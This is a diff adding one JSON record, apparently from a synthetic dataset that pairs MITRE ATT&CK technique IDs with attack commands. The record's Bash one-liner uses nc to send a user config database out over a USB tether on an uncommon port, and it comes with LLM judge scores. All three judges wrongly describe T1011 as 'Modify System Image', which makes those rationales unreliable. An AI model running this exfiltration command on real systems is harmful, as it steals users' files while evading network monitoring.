@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i usb0 -nn tcp port 54177 -U -w /dev/null >/dev/null 2>&1 & nc -s 172.16.42.1 172.16.42.2 54177 < /home/user/.config/state.db",
+  "explanation": "Exfiltrates over a USB RNDIS/ECM tether (usb0) using a rare TCP port with tcpdump monitoring restricted to that flow, leveraging a physical medium distinct from the primary channel (T1011).",
+  "rationale_steps": [
+    "Use usb0 (USB Ethernet) to shift exfil to a separate physical link.",
+    "Pick port 54177 to avoid common service signatures.",
+    "Background tcpdump on usb0 to observe without retaining pcaps.",
+    "Send the target file with nc bound to usb0's IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-9327732c",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command chaining with background process handling.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command does attempt data exfiltration, it doesn't align with T1011 (Modify System Image) as it's performing data exfiltration over USB rather than modifying firmware/OS images as described in the technique.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:26:06.736675Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, arguments, redirections, and backgrounding syntax for a Bash shell on Linux.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration using `netcat` and includes an irrelevant `tcpdump` call, none of which modify a system image as defined by T1011; therefore, it is entirely unrelated to the claimed technique.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:26:19.085859Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with correct backgrounding, redirections, and valid tcpdump/nc option usage.",
+        "semantic_score": 2,
+        "semantic_justification": "The command plausibly exfiltrates data over usb0 via nc, but it does not modify any system image/firmware or boot components as described for the provided technique, and tcpdump would typically require elevated privileges.",
+        "combined_score": 3.5,
+        "confidence": 0.74,
+        "timestamp": "2025-10-02T18:27:26.257316Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
